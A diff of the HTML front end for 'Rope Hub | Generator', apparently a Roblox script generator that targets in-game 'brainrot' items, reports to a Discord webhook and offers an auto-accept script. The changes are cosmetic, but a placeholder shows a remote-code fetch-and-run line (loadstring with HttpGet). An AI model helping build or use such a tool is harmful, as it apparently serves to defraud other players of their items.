@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Rope Hub | Generator</title>
+    <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/5968/5968705.png">
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
@@ -21,11 +22,11 @@
         <div class="card">
             <div class="form-group">
                 <label>👤 Roblox Nickname</label>
-                <input type="text" id="robloxNick" placeholder="sdfgrijjkdsfg">
+                <input type="text" id="robloxNick" placeholder="Your nickname">
             </div>
             <div class="form-group">
                 <label>🆔 Roblox User ID</label>
-                <input type="text" id="robloxId" placeholder="8986116710">
+                <input type="text" id="robloxId" placeholder="Your user ID">
             </div>
             <div class="form-group">
                 <label>🔗 Discord Webhook URL</label>
@@ -36,8 +37,8 @@
         <div class="card">
             <label>🎯 Target Brainrots</label>
             <div class="button-group">
-                <button id="selectAllBtn" class="btn-secondary">Select All</button>
-                <button id="deselectAllBtn" class="btn-secondary">Clear All</button>
+                <button id="selectAllBtn" class="btn-secondary">✅ Select All</button>
+                <button id="deselectAllBtn" class="btn-secondary">❌ Clear All</button>
             </div>
             <input type="text" id="searchBrainrots" class="search-input" placeholder="🔍 Search...">
             <div class="checkbox-grid" id="brainrotsList"></div>
@@ -46,15 +47,16 @@
         <div class="card">
             <label>📦 Additional Script</label>
             <div class="radio-group">
-                <label class="radio-label"><input type="radio" name="scriptType" value="22s" checked> 22s Hub</label>
+                <label class="radio-label"><input type="radio" name="scriptType" value="none" checked> None</label>
+                <label class="radio-label"><input type="radio" name="scriptType" value="22s"> 22s Hub</label>
                 <label class="radio-label"><input type="radio" name="scriptType" value="custom"> Custom Script</label>
             </div>
             <textarea id="customScript" placeholder="loadstring(game:HttpGet('URL'))()" style="display: none;"></textarea>
         </div>
 
         <div class="action-buttons">
-            <button id="generateBtn" class="btn-primary">ENERATE</button>
-            <button id="copyBtn" class="btn-copy" style="display: none;">COPY</button>
+            <button id="generateBtn" class="btn-primary">🚀 GENERATE</button>
+            <button id="copyBtn" class="btn-copy" style="display: none;">📋 COPY</button>
         </div>
 
         <div id="output" class="output-box" style="display: none;">
@@ -68,7 +70,7 @@
                     <img src="https://static.vecteezy.com/system/resources/thumbnails/018/930/718/small/discord-logo-discord-icon-transparent-free-png.png" alt="Discord">
                     DISCORD
                 </button>
-                <button id="autoacceptBtn" class="autoaccept-btn">✨ Script for auto accept + antiafk</button>
+                <button id="autoacceptBtn" class="autoaccept-btn">✨ Auto Accept</button>
             </div>
             <div class="credits">created by <span class="gradient-text">architect</span></div>
         </div>
